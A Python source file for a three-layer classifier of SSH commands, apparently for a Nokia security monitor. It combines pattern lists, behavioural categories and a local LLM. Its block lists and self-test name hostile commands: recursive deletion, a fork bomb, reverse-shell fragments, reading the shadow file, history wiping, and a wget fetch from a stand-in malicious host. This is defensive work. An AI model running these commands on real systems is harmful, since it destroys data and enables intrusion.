"""
Nokia SSH Agentic AI - 3-Layer Threat Classifier
Layer 1: Known pattern matching (instant)
Layer 2: Category-based behavioral detection (smart)
Layer 3: Ollama AI classification (catches unknown threats)
"""

import json
import re
import os
import requests
from dotenv import load_dotenv

load_dotenv()

OLLAMA_HOST = os.getenv("OLLAMA_HOST", "http://localhost:11434")
OLLAMA_MODEL = os.getenv("OLLAMA_MODEL", "llama3.1:8b")

# LAYER 1: Known dangerous patterns

LAYER1_PATTERNS = {
    "CRITICAL": [
        "rm -rf", "rm -fr", "rm --recursive --force",
        "dd if=", "dd of=/dev/",
        "mkfs", "mkfs.ext4", "mkfs.ntfs",
        "shred /dev/", "wipefs",
        ":(){ :|:& };:",
        "> /dev/sda", "> /dev/hda",
        "/dev/tcp/", "/dev/udp/",
        "bash -i >& /dev/",
        "0>&1",
        "chmod 777 /etc/passwd",
        "chmod 777 /etc/shadow",
        "chmod 777 /etc/sudoers",
    ],
    "HIGH": [
        "history -c", "history -w",
        "unset HISTFILE",
        "export HISTSIZE=0",
        "export HISTFILESIZE=0",
        "sudo useradd", "sudo adduser",
        "useradd ", "adduser ",
        "passwd root", "passwd admin",
        "chmod +s",
        "cat /etc/shadow",
        "cat /etc/sudoers",
        "rm /var/log",
        "sudo su -", "sudo su root",
        "chown root:root",
        "visudo",
        "crontab -e",
        "crontab -l",
        "crontab -r",
    ],
    "MEDIUM": [
        "wget http", "wget ftp",
        "curl http", "curl ftp",
        "scp ", "sftp ",
        "nmap ", "masscan ",
        "nc ", "netcat ",
        "python3 -c", "python -c",
        "perl -e", "ruby -e",
        "bash -i", "sh -i",
        "base64 -d",
        "at now",
    ],
}


def layer1_classify(command: str) -> dict | None:
    """Layer 1: Exact pattern matching against known dangerous commands."""
    cmd = command.lower().strip()

    for severity, patterns in LAYER1_PATTERNS.items():
        for pattern in patterns:
            if pattern.lower() in cmd:
                return {
                    "severity": severity,
                    "layer": 1,
                    "matched_pattern": pattern,
                    "category": "known_threat",
                    "reason": f"Matched known dangerous pattern: '{pattern}'",
                    "is_dangerous": severity in ["CRITICAL", "HIGH"],
                }
    return None


# LAYER 2: Category-based behavioral detection

LAYER2_CATEGORIES = {
    "file_destruction": {
        "description": "File or filesystem destruction attempt",
        "severity": "CRITICAL",
        "keywords": ["rm", "del", "unlink", "shred", "wipe", "truncate"],
        "dangerous_flags": ["-rf", "-fr", "-f", "--force", "--recursive", "-r"],
        "dangerous_targets": ["/", "/home", "/etc", "/var", "/usr", "/boot"],
        "require_flag_and_keyword": True,
    },
    "privilege_escalation": {
        "description": "Attempt to gain elevated privileges",
        "severity": "HIGH",
        "keywords": ["sudo", "su", "pkexec", "doas"],
        "dangerous_targets": ["bash", "sh", "root", "/bin/bash", "/bin/sh"],
        "require_flag_and_keyword": False,
    },
    "permission_modification": {
        "description": "Dangerous permission or ownership change",
        "severity": "HIGH",
        "keywords": ["chmod", "chown", "chgrp", "setfacl"],
        "dangerous_targets": ["/etc/", "/bin/", "/usr/", "sudoers", "shadow", "passwd"],
        "require_flag_and_keyword": False,
    },
    "anti_forensics": {
        "description": "Attempt to erase evidence or evade detection",
        "severity": "HIGH",
        "keywords": ["history", "shred", "srm", "secure-delete", "bleachbit"],
        "dangerous_flags": ["-c", "-w", "-d", "--clear"],
        "require_flag_and_keyword": True,
    },
    "reverse_shell": {
        "description": "Possible reverse shell or command execution attempt",
        "severity": "CRITICAL",
        "keywords": ["bash", "sh", "nc", "netcat", "python", "python3", "perl", "ruby", "php", "lua"],
        "dangerous_targets": [">&", "0>&1", "2>&1", "/dev/tcp", "/dev/udp", "-e /bin", "-e /usr"],
        "require_flag_and_keyword": False,
    },
    "credential_access": {
        "description": "Attempt to access sensitive credential files",
        "severity": "HIGH",
        "keywords": ["cat", "more", "less", "head", "tail", "strings", "grep", "awk", "sed", "vim", "nano", "view"],
        "dangerous_targets": ["/etc/shadow", "/etc/passwd", "/etc/sudoers", "id_rsa", ".ssh/", "authorized_keys", ".bash_history", ".zsh_history"],
        "require_flag_and_keyword": False,
    },
    "data_exfiltration": {
        "description": "Possible data exfiltration to external destination",
        "severity": "MEDIUM",
        "keywords": ["scp", "rsync", "ftp", "sftp", "rclone", "aws s3", "gsutil", "curl", "wget"],
        "dangerous_targets": ["http://", "ftp://", "sftp://", "@"],
        "require_flag_and_keyword": False,
    },
    "network_reconnaissance": {
        "description": "Network scanning or reconnaissance activity",
        "severity": "MEDIUM",
        "keywords": ["nmap", "masscan", "arp-scan", "netdiscover", "zmap", "unicornscan"],
        "dangerous_flags": [],
        "require_flag_and_keyword": False,
    },
    "user_management": {
        "description": "Unauthorized user or group creation/modification",
        "severity": "HIGH",
        "keywords": ["useradd", "adduser", "usermod", "groupadd", "groupmod", "newuser"],
        "dangerous_flags": [],
        "require_flag_and_keyword": False,
    },
    "persistence": {
        "description": "Attempt to establish persistence on the system",
        "severity": "HIGH",
        "keywords": ["crontab", "systemctl", "service", "update-rc.d", "chkconfig", "at "],
        "dangerous_targets": ["enable", "start", "add", "install"],
        "require_flag_and_keyword": False,
    },
}


def layer2_classify(command: str) -> dict | None:
    """Layer 2: Category-based behavioral detection."""
    cmd = command.lower().strip()

    for category_name, category in LAYER2_CATEGORIES.items():
        keywords = category.get("keywords", [])
        dangerous_targets = category.get("dangerous_targets", [])
        dangerous_flags = category.get("dangerous_flags", [])
        require_both = category.get("require_flag_and_keyword", False)

        keyword_found = any(kw.lower() in cmd for kw in keywords)
        target_found = any(target.lower() in cmd for target in dangerous_targets)
        flag_found = any(flag.lower() in cmd for flag in dangerous_flags)

        if not keyword_found:
            continue

        if require_both:
            if dangerous_targets and not (target_found or flag_found):
                continue
            if dangerous_flags and not flag_found:
                continue

        if dangerous_targets and not target_found and not require_both:
            if dangerous_flags and not flag_found:
                continue

        matched = [keyword for keyword in keywords if keyword.lower() in cmd]
        return {
            "severity": category["severity"],
            "layer": 2,
            "matched_pattern": ", ".join(matched[:3]),
            "category": category_name,
            "reason": category["description"],
            "is_dangerous": category["severity"] in ["CRITICAL", "HIGH"],
        }

    return None


# LAYER 3: Ollama AI classification


def layer3_classify(command: str) -> dict:
    """Layer 3: AI-based classification using Ollama."""
    prompt = (
        "You are a Linux security expert analyzing SSH commands.\n"
        "Classify the following command for security risk.\n\n"
        f"Command: {command}\n\n"
        "Respond with JSON only, no explanation outside JSON:\n"
        "{\n"
        '  "severity": "CRITICAL or HIGH or MEDIUM or LOW",\n'
        '  "category": "short category name",\n'
        '  "reason": "one sentence explanation",\n'
        '  "is_dangerous": true or false\n'
        "}"
    )

    try:
        response = requests.post(
            f"{OLLAMA_HOST}/api/generate",
            json={"model": OLLAMA_MODEL, "prompt": prompt, "stream": False},
            timeout=30,
        )
        raw = response.json().get("response", "")
        match = re.search(r"\{.*?\}", raw, re.DOTALL)
        if match:
            result = json.loads(match.group())
            result["layer"] = 3
            result["matched_pattern"] = "ai_detected"
            return result
    except Exception:
        pass

    return {
        "severity": "LOW",
        "layer": 3,
        "matched_pattern": "ollama_unavailable",
        "category": "unknown",
        "reason": "Could not classify - Ollama unavailable",
        "is_dangerous": False,
    }


# MAIN CLASSIFIER: combines all 3 layers


def classify_command(command: str) -> dict:
    """Run the three layers in order and return the first matching result."""
    result = layer1_classify(command)
    if result:
        result["command"] = command
        return result

    result = layer2_classify(command)
    if result:
        result["command"] = command
        return result

    result = layer3_classify(command)
    result["command"] = command
    return result


def get_recommended_action(severity: str) -> str:
    actions = {
        "CRITICAL": "Terminate session immediately. Alert Nokia security team. Preserve evidence.",
        "HIGH": "Investigate session urgently. Review command context and user activity.",
        "MEDIUM": "Monitor closely. Verify if command is authorized.",
        "LOW": "Normal activity. No action required.",
    }
    return actions.get(severity, "Review command.")


if __name__ == "__main__":
    test_commands = [
        ("rm -rf /data", "CRITICAL"),
        ("history -c", "HIGH"),
        ("chmod 777 /etc/passwd", "CRITICAL"),
        ("wget http://malicious.com/shell.sh", "MEDIUM"),
        ("rm -r --force /home/user", "CRITICAL"),
        ("python3 -c 'import socket' /dev/tcp/", "CRITICAL"),
        ("cat /etc/shadow", "HIGH"),
        ("sudo bash", "HIGH"),
        ("nmap -sV 192.168.1.0/24", "MEDIUM"),
        ("crontab -e", "HIGH"),
        ("ls -la", "LOW"),
        ("whoami", "LOW"),
        ("df -h", "LOW"),
    ]

    print("Nokia SSH 3-Layer Threat Classifier - Self Test")
    print("=" * 60)

    passed = 0
    failed = 0

    for cmd, expected in test_commands:
        result = classify_command(cmd)
        status = "PASS" if result["severity"] == expected else "WARN"
        if result["severity"] == expected:
            passed += 1
        else:
            failed += 1

        print(f"\n[{status}] Command  : {cmd}")
        print(f"   Expected : {expected}")
        print(f"   Got      : {result['severity']} (Layer {result['layer']})")
        print(f"   Category : {result['category']}")
        print(f"   Reason   : {result['reason']}")

    print("\n" + "=" * 60)
    print(f"Results: {passed} passed, {failed} warnings")
    print("(Layer 3 AI results may differ from expected - that is normal)")
    print("Self test complete!")
